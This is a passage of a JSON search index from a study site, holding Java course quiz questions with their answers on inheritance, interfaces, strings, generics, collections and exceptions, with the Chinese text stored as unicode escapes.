\u65b9\u6cd5\u91cd\u5b9a\u4e49\u7684\u8fd4\u56de\u503c\u7c7b\u578b\u5fc5\u987b\u76f8\u540c\u6216\u76f8\u5bb9\u3002","title":"\u5728Java\u4e2d\uff0c\u4ee5\u4e0b\u5173\u4e8e\u65b9\u6cd5\u91cd\u8f7d\u548c\u65b9\u6cd5\u91cd\u5b9a\u4e49\u63cf\u8ff0\u6b63\u786e\u7684\u662f\uff1f"},{"location":"uooc/java/4/#_15","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_16","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u65b9\u6cd5\u7684\u8986\u76d6\u662f\u5728\u5b50\u7c7b\u4e2d\u518d\u6b21\u5b9e\u73b0\u7236\u7c7b\u4e2d\u5df2\u7ecf\u5b9e\u73b0\u8fc7\u7684\u65b9\u6cd5\u3002"},{"location":"uooc/java/4/#_17","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#final","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u53ef\u4ee5\u7528final\u8bf4\u660e\u53d8\u91cf\u4e3a\u4e00\u4e2a\u5e38\u91cf\u3002"},{"location":"uooc/java/4/#_18","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#final_1","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u88abfinal\u4fee\u9970\u7b26\u4fee\u9970\u7684\u7c7b\uff0c\u4e0d\u80fd\u88ab\u7ee7\u627f\u3002"},{"location":"uooc/java/4/#_19","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_20","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u6700\u7ec8\u7c7b\u4e0d\u80fd\u6d3e\u751f\u5b50\u7c7b\uff0c\u4f46\u6700\u7ec8\u65b9\u6cd5\u53ef\u4ee5\u88ab\u8986\u76d6\u3002"},{"location":"uooc/java/4/#_21","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#43-super","text":"","title":"4.3 super\u5173\u952e\u5b57"},{"location":"uooc/java/4/#super","text":"A. \u653e\u5728\u5b50\u7c7b\u6784\u9020\u65b9\u6cd5\u7b2c\u4e00\u6761\u8bed\u53e5 B. \u653e\u5728\u5b50\u7c7b\u6784\u9020\u65b9\u6cd5\u4efb\u4f55\u4f4d\u7f6e C. \u53ef\u4ee5\u91c7\u7528\u521d\u59cb\u5316\u5217\u8868\u65b9\u5f0f\u6267\u884c D. \u53ef\u4ee5\u8c03\u7528this\u5173\u952e\u5b57","title":"\u5982\u679c\u5b50\u7c7b\u8981\u521d\u59cb\u5316\u7236\u7c7b\u7684\u7c7b\u53d8\u91cf\uff0c\u8c03\u7528super\u8bed\u53e5\u5fc5\u987b\uff1a"},{"location":"uooc/java/4/#_22","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#thissupermain","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"this\u548csuper\u90fd\u53ef\u4ee5\u5728main()\u65b9\u6cd5\u4e2d\u4f7f\u7528"},{"location":"uooc/java/4/#_23","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#44","text":"","title":"4.4 \u4e0a\u8f6c\u578b\u5bf9\u8c61"},{"location":"uooc/java/4/#_24","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class UpByOne { private int num = 0 ; public int getNum () { return num ; } public void setNum ( int x ) { num = x ; } public void up () { num = num + 1 ; } } class UpByTwo extends UpByOne { public void up () { // missing code goes here } }","title":"\u8003\u8651\u4ee5\u4e0b\u4e24\u4e2a\u7c7b:"},{"location":"uooc/java/4/#upbytwoupnum2","text":"A. num = num + 2; B. super.up(); super.up(); C. setNum(getNum()) + 2; D. super.up() + 1;","title":"\u5728\u7c7bUpByTwo\u4e2d,\u91cd\u5b9a\u4e49\u65b9\u6cd5\u65b9\u6cd5up()\uff0c\u4f7f\u5f97num\u52a02\uff0c\u4ee5\u4e0b\u54ea\u6bb5\u4ee3\u7801\u6700\u5408\u9002\u586b\u8865\u7701\u6389\u7684\u4ee3\u7801\uff1f"},{"location":"uooc/java/4/#_25","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#basewidgettypeawidgettypeawidgetspeak","text":"A. Object A=new BaseWidget(); A.speak(); B. BaseWidget B=new TypeAWidget(); B.speak(); C. TypeAWidget C=new BaseWidget(); D. speak();","title":"\u5047\u8bbe\u7c7bBaseWidget\u662f\u7c7bTypeAWidget\u7684\u7236\u7c7b\uff0c\u5e76\u4e14\u5728\u7c7bTypeAWidget\u4e2d\u91cd\u5199\u4e86\u65b9\u6cd5speak()\uff0c\u90a3\u4e48\u4e0b\u5217\u54ea\u4e2a\u7a0b\u5e8f\u7247\u6bb5\u80fd\u6b63\u786e\u7f16\u8bd1\u6267\u884c\uff1f"},{"location":"uooc/java/4/#_26","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_27","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e0a\u8f6c\u578b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u5b50\u7c7b\u4e2d\u57fa\u7c7b\u88ab\u8986\u76d6\u7684\u65b9\u6cd5\u3002"},{"location":"uooc/java/4/#_28","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_29","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e0a\u8f6c\u578b\u5bf9\u8c61\u53ef\u4ee5\u8c03\u7528\u5b50\u7c7b\u4e2d\u65b0\u7684\u65b9\u6cd5\u3002"},{"location":"uooc/java/4/#_30","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#java_1","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"Java\u8bed\u8a00\u91cc\u7684\u4e0a\u8f6c\u578b\u5bf9\u8c61\u4e5f\u5373\u662f\u6240\u8c13\u7684\u7236\u7c7b\u7ed9\u5b50\u7c7b\u5bf9\u8c61\u8d4b\u503c\u800c\u5df2"},{"location":"uooc/java/4/#_31","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#java_2","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"Java\u4e0d\u5141\u8bb8\u4e0a\u8f6c\u578b\u5bf9\u8c61\u518d\u91cd\u65b0\u7ed9\u5b50\u7c7b\u5bf9\u8c61\u8d4b\u503c\u3002"},{"location":"uooc/java/4/#_32","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#45","text":"","title":"4.5 \u62bd\u8c61\u7c7b"},{"location":"uooc/java/4/#_33","text":"1 2 3 4 5 6 7 8 9 10 11 abstract class MineBase { abstract void amethod (); static int i ; } public class Mine extends MineBase { public static void main ( String argv []){ int [] ar = new int [ 5 ]; for ( i = 0 ; i < ar . length ; i ++) System . out . println ( ar [ i ]); } } A. \u7a0b\u5e8f\u6b63\u786e\uff0c\u6ca1\u6709\u62a5\u9519\uff0c\u5e76\u4e14\u8f93\u51fa\u5305\u542b5\u4e2a0\u7684\u5e8f\u5217 B. Error: ar is used before it is initialized C. Error Mine must be declared abstract D. IndexOutOfBoundes Error","title":"\u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/4/#_34","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_35","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u542b\u6709\u62bd\u8c61\u65b9\u6cd5\u7684\u7c7b\u5fc5\u987b\u58f0\u660e\u4e3a\u62bd\u8c61\u7c7b\u3002"},{"location":"uooc/java/4/#_36","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_37","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u62bd\u8c61\u7c7b\u53ef\u4ee5\u7528\u6765\u5b9a\u4e49\u5bf9\u8c61\uff0c\u4e5f\u53ef\u4ee5\u88ab\u7ee7\u627f\u3002"},{"location":"uooc/java/4/#_38","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_39","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e00\u4e2a\u62bd\u8c61\u7c7b\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\u90fd\u5fc5\u987b\u662f\u62bd\u8c61\u7684\u3002"},{"location":"uooc/java/4/#_40","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#46","text":"","title":"4.6 \u63a5\u53e3"},{"location":"uooc/java/4/#interface","text":"A. private B. class C. public D. static","title":"interface\u53ef\u4ee5\u88ab\u4ee5\u4e0b\u54ea\u4e2a\u4fee\u9970\u7b26\u4fee\u9970\uff1f"},{"location":"uooc/java/4/#_41","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_42","text":"A. \u63a5\u53e3\u5b9a\u4e49\u7684\u65b9\u6cd5\u53ea\u6709\u5b9e\u73b0 B. \u63a5\u53e3\u4e2d\u7684\u53d8\u91cf\u9ed8\u8ba4\u662fpublic\u3001final\u548cstatic\u7684 C. \u5982\u679c\u4e00\u4e2a\u63a5\u53e3\u7531\u591a\u4e2a\u7c7b\u6765\u5b9e\u73b0\uff0c\u5219\u8fd9\u4e9b\u7c7b\u5728\u5b9e\u73b0\u8be5\u63a5\u53e3\u4e2d\u7684\u65b9\u6cd5\u65f6\u91c7\u7528\u7edf\u4e00\u7684\u4ee3\u7801 D. \u5982\u679c\u4e00\u4e2a\u7c7b\u5b9e\u73b0\u4e86\u63a5\u53e3\uff0c\u5219\u5fc5\u987b\u5b9e\u73b0\u8be5\u63a5\u53e3\u4e2d\u7684\u6240\u6709\u65b9\u6cd5\uff0c\u4f46\u65b9\u6cd5\u53ef\u4e0d\u4e3apublic","title":"\u5173\u4e8e\u63a5\u53e3\u7684\u5b9a\u4e49\u548c\u5b9e\u73b0\uff0c\u4ee5\u4e0b\u63cf\u8ff0\u6b63\u786e\u7684\u662f:"},{"location":"uooc/java/4/#_43","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_44","text":"A. \u63a5\u53e3\u4e0d\u652f\u6301\u591a\u91cd\u7ee7\u627f B. \u63a5\u53e3\u6240\u6709\u65b9\u6cd5\u662f\u62bd\u8c61\u7684 C. \u63a5\u53e3\u91cc\u7684\u65b9\u6cd5\u8bbf\u95ee\u5c5e\u6027\u5747\u4e3apublic D. \u5b9e\u73b0\u63a5\u53e3\u7684\u5173\u952e\u5b57\u662fimplements","title":"\u5173\u4e8e\u63a5\u53e3\u4e0b\u9762\u4e0d\u6b63\u786e\u7684\u8bf4\u6cd5\u662f\uff1a"},{"location":"uooc/java/4/#_45","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_46","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u4e00\u4e2a\u7c7b\u53ea\u80fd\u7ee7\u627f\u5355\u4e2a\u7236\u7c7b\uff0c\u4e00\u4e2a\u7c7b\u53ea\u80fd\u5b9e\u73b0\u4e00\u4e2a\u63a5\u53e3\u3002"},{"location":"uooc/java/4/#_47","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_48","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u63a5\u53e3\u4e0d\u80fd\u58f0\u660e\u6784\u9020\u51fd\u6570\u3002"},{"location":"uooc/java/4/#_49","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#47","text":"","title":"4.7 \u63a5\u53e3\u56de\u8c03"},{"location":"uooc/java/4/#_50","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 interface InterfaceA { String s = \"Hello\" ; void f (); } class ClassA implements InterfaceA { public void f (){ System . out . print ( s ); } } class ClassB { void g ( InterfaceA a ){ a . f (); } } public class E { public static void main ( String [] args ) { ClassB b = new ClassB (); b . g ( new ClassA ()); } } A. Hello B. \u7f16\u8bd1\u6b63\u786e\uff0c\u4f46\u65e0\u8fd0\u884c\u7ed3\u679c C. \u7f16\u8bd1\u9519\u8bef\uff1ab.g(new ClassA()) D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9","title":"\u7ed9\u5b9a\u4ee5\u4e0b\u7a0b\u5e8f\u7247\u6bb5\uff0c\u7ed3\u679c\u4e3a\uff1f"},{"location":"uooc/java/4/#_51","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_52","text":"1 2 3 4 5 6 7 8 9 10 11 12 interface B { void f (); } class A implements B { public void f (){ System . out . println ( \"I love java\uff01\" ); } public static void main ( String [] args ) { B b = new A (); b . f (); } } A. \u6267\u884c\u9519\u8bef B. I love java\uff01 C. \u7f16\u8bd1\u9519\u8bef D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9","title":"\u7ed9\u5b9a\u5982\u4e0b\u7a0b\u5e8f\uff0c\u8fd0\u884c\u7ed3\u679c\u4e3a\uff1a"},{"location":"uooc/java/4/#_53","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/4/#_54","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 interface InterfaceA { String s = \"good \" ; void f (); } abstract class ClassA { abstract void g (); } class ClassB extends ClassA implements InterfaceA { void g (){ System . out . print ( s ); } public void f (){ System . out . print ( \" \" + s ); } } public class E { public static void main ( String [] args ) { ClassA a = new ClassB (); InterfaceA b = new ClassB (); a . g (); b . f (); } }","title":"\u7ed9\u51fa\u5982\u4e0b\u7a0b\u5e8f\uff1a"},{"location":"uooc/java/4/#_55","text":"A. \u7f16\u8bd1\u6b63\u786e\uff0c\u4f46\u65e0\u8fd0\u884c\u7ed3\u679c B. \u7f16\u8bd1\u9519\u8bef\uff1aInterfaceA b=new ClassB(); C. good good D. \u4ee5\u4e0a\u90fd\u4e0d\u5bf9","title":"\u5176\u8fd0\u884c\u7ed3\u679c\u662f\uff1f"},{"location":"uooc/java/4/#_56","text":"C","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/","text":"5.1 String\u7c7b \u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f 1 2 3 4 String s = new String ( \"Bicycle\" ); int iBegin = 1 ; char iEnd = 3 ; System . out . println ( s . substring ( iBegin , iEnd )); A. \u8f93\u51faBic B. \u8f93\u51faic C. \u8f93\u51faicy D. \u7f16\u8bd1\u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u4e0b\u9762\u54ea\u4e2a\u662f\u5bf9\u5b57\u7b26\u4e32String\u7684\u6b63\u786e\u5b9a\u4e49 A. String s1=null; B. String s2='null'; C. String s3=(String)'abc'; D. String s4=(String)'\\uface'; \u89e3\u51b3\u65b9\u6848 A \u5b57\u7b26\u4e32s = \u201dJava\u201d\uff0c\u627e\u51fa\u5b57\u6bcdv\u5728\u5b57\u7b26\u4e32s\u4e2d\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u662f\u6b63\u786e\u7684\uff1f A. mid(2,s); B. charAt(2); C. indexOf(s); D. s.indexOf('v'); \u89e3\u51b3\u65b9\u6848 D \u7ed9\u51fa\u4ee5\u4e0b\u53d8\u91cf\u5b9a\u4e49\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u8bed\u53e5\u662f\u6b63\u786e\u7684\uff1f 1 2 3 String s1 = new String ( \"Hello\" ); String s2 = new String ( \"there\" ); String s3 = new String (); A. s3=s1 + s2; B. s3=s1 - s2; C. s3=s1 & s2; D. s3=s1 && s2; \u89e3\u51b3\u65b9\u6848 A \u4ee5\u4e0b\u54ea\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff1f A. length() B. compareto() C. indexOf() D. touppercase() \u89e3\u51b3\u65b9\u6848 A 5.2 StringBuilder\u7c7b StringBuilder\u7c7b\u4e2d\u7684\u65b9\u6cd5capacity()\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\u7684 A. \u957f\u5ea6 B. \u5bb9\u91cf C. \u5b57\u8282\u6570 D. \u5b57\u7b26\u4e32\u7684\u4e2a\u6570 \u89e3\u51b3\u65b9\u6848 B String\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u53ef\u4ee5\u901a\u8fc7String\u5bf9\u8c61\u7684\u65b9\u6cd5replace(char oldChar, char newChar)\u4fee\u6539\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B \u5982\u679c\u8981\u5bf9\u5b57\u7b26\u4e32\u5185\u5bb9\u9891\u7e41\u4fee\u6539\uff0c\u5efa\u8bae\u4f7f\u7528StringBuilder\u7c7b\u800c\u975eString\u7c7b\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A 5.3 StringBuffer\u7c7b StringBuffer\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u53ef\u4ee5\u88ab\u4fee\u6539\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A StringBuilder\u662f\u7ebf\u7a0b\u5b89\u5168\u7684 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B StringBuffer\u662f\u7ebf\u7a0b\u5b89\u5168\u7684 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A","title":"5 \u5b57\u7b26\u4e32\u53ca\u5176\u5e94\u7528"},{"location":"uooc/java/5/#51-string","text":"","title":"5.1 String\u7c7b"},{"location":"uooc/java/5/#_1","text":"1 2 3 4 String s = new String ( \"Bicycle\" ); int iBegin = 1 ; char iEnd = 3 ; System . out . println ( s . substring ( iBegin , iEnd )); A. \u8f93\u51faBic B. \u8f93\u51faic C. \u8f93\u51faicy D. \u7f16\u8bd1\u9519\u8bef","title":"\u7f16\u8bd1\u53ca\u8fd0\u884c\u4ee5\u4e0b\u4ee3\u7801\uff0c\u4e0b\u5217\u9009\u9879\u54ea\u4e2a\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/5/#_2","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#string","text":"A. String s1=null; B. String s2='null'; C. String s3=(String)'abc'; D. String s4=(String)'\\uface';","title":"\u4e0b\u9762\u54ea\u4e2a\u662f\u5bf9\u5b57\u7b26\u4e32String\u7684\u6b63\u786e\u5b9a\u4e49"},{"location":"uooc/java/5/#_3","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#s-javavs","text":"A. mid(2,s); B. charAt(2); C. indexOf(s); D. s.indexOf('v');","title":"\u5b57\u7b26\u4e32s = \u201dJava\u201d\uff0c\u627e\u51fa\u5b57\u6bcdv\u5728\u5b57\u7b26\u4e32s\u4e2d\u7684\u4f4d\u7f6e\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u9009\u9879\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/5/#_4","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#_5","text":"1 2 3 String s1 = new String ( \"Hello\" ); String s2 = new String ( \"there\" ); String s3 = new String (); A. s3=s1 + s2; B. s3=s1 - s2; C. s3=s1 & s2; D. s3=s1 && s2;","title":"\u7ed9\u51fa\u4ee5\u4e0b\u53d8\u91cf\u5b9a\u4e49\uff0c\u4ee5\u4e0b\u54ea\u4e2a\u8bed\u53e5\u662f\u6b63\u786e\u7684\uff1f"},{"location":"uooc/java/5/#_6","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#_7","text":"A. length() B. compareto() C. indexOf() D. touppercase()","title":"\u4ee5\u4e0b\u54ea\u4e2a\u65b9\u6cd5\u53ef\u4ee5\u8fd4\u56de\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff1f"},{"location":"uooc/java/5/#_8","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#52-stringbuilder","text":"","title":"5.2 StringBuilder\u7c7b"},{"location":"uooc/java/5/#stringbuildercapacity","text":"A. \u957f\u5ea6 B. \u5bb9\u91cf C. \u5b57\u8282\u6570 D. \u5b57\u7b26\u4e32\u7684\u4e2a\u6570","title":"StringBuilder\u7c7b\u4e2d\u7684\u65b9\u6cd5capacity()\u8fd4\u56de\u7684\u662f\u5b57\u7b26\u4e32\u7684"},{"location":"uooc/java/5/#_9","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#stringstringreplacechar-oldchar-char-newchar","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"String\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u53ef\u4ee5\u901a\u8fc7String\u5bf9\u8c61\u7684\u65b9\u6cd5replace(char oldChar, char newChar)\u4fee\u6539\u3002"},{"location":"uooc/java/5/#_10","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#stringbuilderstring","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5982\u679c\u8981\u5bf9\u5b57\u7b26\u4e32\u5185\u5bb9\u9891\u7e41\u4fee\u6539\uff0c\u5efa\u8bae\u4f7f\u7528StringBuilder\u7c7b\u800c\u975eString\u7c7b\u3002"},{"location":"uooc/java/5/#_11","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#53-stringbuffer","text":"","title":"5.3 StringBuffer\u7c7b"},{"location":"uooc/java/5/#stringbuffer","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"StringBuffer\u7c7b\u578b\u7684\u5b57\u7b26\u4e32\u7684\u5185\u5bb9\u53ef\u4ee5\u88ab\u4fee\u6539\u3002"},{"location":"uooc/java/5/#_12","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#stringbuilder","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"StringBuilder\u662f\u7ebf\u7a0b\u5b89\u5168\u7684"},{"location":"uooc/java/5/#_13","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/5/#stringbuffer_1","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"StringBuffer\u662f\u7ebf\u7a0b\u5b89\u5168\u7684"},{"location":"uooc/java/5/#_14","text":"A","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/6/","text":"6.1\u6cdb\u578b \u5df2\u77e5\u6709\u6cdb\u578b\u7c7bBox \uff0c\u4e0b\u9762\u54ea\u4e9b\u8bed\u53e5\u662f\u6b63\u786e\u7684\uff1a A. Box box; B. Box box = null; C. Box box; D. Box box = null; \u89e3\u51b3\u65b9\u6848 CD \u6cdb\u578b\u7c7b\u7684\u5b9a\u4e49\u5982\u4e0b\u6240\u793a\uff1a 1 2 3 class Box < T >{ ... } \u5c16\u62ec\u53f7\u5185\u7684\u7c7b\u578b\u53c2\u6570\u4e2a\u6570\u53ea\u80fd\u662f\u4e00\u4e2a\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 B 6.2 Collection\u96c6\u5408\u7c7b \u4e0b\u9762\u4ee3\u7801\u7684\u8fd0\u884c\u7ed3\u679c\u662f\uff1a 1 2 3 4 HashSet myset = new HashSet (); myset . add ( new String ( \"Java\" )); //\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20 myset . add ( \"Java\" ); //\u518d\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20 System . out . println ( myset . size ()); A. 0 B. 1 C. 2 D. \u9519\u8bef\uff0c\u65e0\u6cd5\u8fd0\u884c \u89e3\u51b3\u65b9\u6848 B \u91cd\u590d\u5143\u7d20 \u4e0b\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u662f\uff1a 1 2 3 4 5 ArrayList < String > mylist = new ArrayList < String >(); mylist . add ( \"Java\" ); mylist . add ( \"\u662f\u597d\u8bed\u8a00\" ); mylist . add ( \"\uff01\" ); System . out . println ( mylist . size ()); A. 0 B. 1 C. 2 D. 3 \u89e3\u51b3\u65b9\u6848 D","title":"6 \u6cdb\u578b\u4e0e\u96c6\u5408"},{"location":"uooc/java/6/#61","text":"","title":"6.1\u6cdb\u578b"},{"location":"uooc/java/6/#box","text":"A. Box box; B. Box box = null; C. Box box; D. Box box = null;","title":"\u5df2\u77e5\u6709\u6cdb\u578b\u7c7bBox\uff0c\u4e0b\u9762\u54ea\u4e9b\u8bed\u53e5\u662f\u6b63\u786e\u7684\uff1a"},{"location":"uooc/java/6/#_1","text":"CD","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/6/#_2","text":"1 2 3 class Box < T >{ ... }","title":"\u6cdb\u578b\u7c7b\u7684\u5b9a\u4e49\u5982\u4e0b\u6240\u793a\uff1a"},{"location":"uooc/java/6/#_3","text":"A. \u6b63\u786e B. \u9519\u8bef","title":"\u5c16\u62ec\u53f7\u5185\u7684\u7c7b\u578b\u53c2\u6570\u4e2a\u6570\u53ea\u80fd\u662f\u4e00\u4e2a\u3002"},{"location":"uooc/java/6/#_4","text":"B","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/6/#62-collection","text":"","title":"6.2 Collection\u96c6\u5408\u7c7b"},{"location":"uooc/java/6/#_5","text":"1 2 3 4 HashSet myset = new HashSet (); myset . add ( new String ( \"Java\" )); //\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20 myset . add ( \"Java\" ); //\u518d\u6dfb\u52a0\u4e00\u4e2a\u5143\u7d20 System . out . println ( myset . size ()); A. 0 B. 1 C. 2 D. \u9519\u8bef\uff0c\u65e0\u6cd5\u8fd0\u884c","title":"\u4e0b\u9762\u4ee3\u7801\u7684\u8fd0\u884c\u7ed3\u679c\u662f\uff1a"},{"location":"uooc/java/6/#_6","text":"B \u91cd\u590d\u5143\u7d20","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/6/#_7","text":"1 2 3 4 5 ArrayList < String > mylist = new ArrayList < String >(); mylist . add ( \"Java\" ); mylist . add ( \"\u662f\u597d\u8bed\u8a00\" ); mylist . add ( \"\uff01\" ); System . out . println ( mylist . size ()); A. 0 B. 1 C. 2 D. 3","title":"\u4e0b\u9762\u4ee3\u7801\u7684\u8f93\u51fa\u7ed3\u679c\u662f\uff1a"},{"location":"uooc/java/6/#_8","text":"D","title":"\u89e3\u51b3\u65b9\u6848"},{"location":"uooc/java/7/","text":"7.1 \u5904\u7406\u5f02\u5e38 \u5f53\u65b9\u6cd5\u9047\u5230\u5f02\u5e38\u53c8\u4e0d\u77e5\u5982\u4f55\u5904\u7406\u65f6\uff0c\u4e0b\u5217\u54ea\u79cd\u8bf4\u6cd5\u662f\u6b63\u786e\u7684\uff1f A. \u6355\u83b7\u5f02\u5e38 B. \u629b\u51fa\u5f02\u5e38 C. \u58f0\u660e\u5f02\u5e38 D. \u5d4c\u5957\u5f02\u5e38 \u89e3\u51b3\u65b9\u6848 B \u8bf7\u95ee\u6240\u6709\u7684\u5f02\u5e38\u7c7b\u7686\u7ee7\u627f\u54ea\u4e00\u4e2a\u7c7b\uff1f A. java.io.Exception B. java.lang.Throwable C. java.lang.Exception D. java.lang.Error \u89e3\u51b3\u65b9\u6848 B \u5f02\u5e38\u662f\u7a0b\u5e8f\u9519\u8bef\u6216\u53ef\u80fd\u5bfc\u81f4\u7a0b\u5e8f\u9519\u8bef\u7684\u4e0d\u6b63\u5e38\u72b6\u6001\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A \u5f53\u4e00\u4e2a\u65b9\u6cd5\u5728\u8fd0\u884c\u8fc7\u7a0b\u4e2d\u4ea7\u751f\u4e00\u4e2a\u5f02\u5e38\uff0c\u5219\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u7ec8\u6b62\uff0c\u4f46\u662f\u6574\u4e2a\u7a0b\u5e8f\u4e0d\u4e00\u5b9a\u7ec8\u6b62\u8fd0\u884c\u3002 A. \u6b63\u786e B. \u9519\u8bef \u89e3\u51b3\u65b9\u6848 A 7.2 \u4f8b\u5916\u5904\u7406\u673a\u5236 \u7f16\u8bd1java\u7a0b\u5e8f\u65f6\u51fa\u73b0error: cannot read: aaa.java\uff0c\u5219\u4e0b\u5217\u539f\u56e0\u6700\u6b63\u786e\u7684\u662f\uff1f A. \u539f\u56e0\u662f\u6267\u884c\u7684\u5f53\u524d\u76ee\u5f55\u4e0b\u6ca1\u6709\u627e\u5230aaa.java\u6587\u4ef6 B. \u539f\u56e0\u662f\u6ca1\u6709\u5b89\u88c5JDK\u5f00\u53d1\u73af\u5883\u3002 C. \u539f\u56e0\u662fjava\u6e90\u6587\u4ef6\u540d\u540e\u7f00\u4e00\u5b9a\u662f\u4ee5 .txt \u7ed3\u5c3e\u3002 D. \u539f\u56e0\u662fJDK\u5b89\u88c5\u540e\u6ca1\u6709\u6b63\u786e\u8bbe\u7f6e\u73af\u5883\u53d8\u91cfPATH\u548cClasspath \u3002 \u89e3\u51b3\u65b9\u6848 A 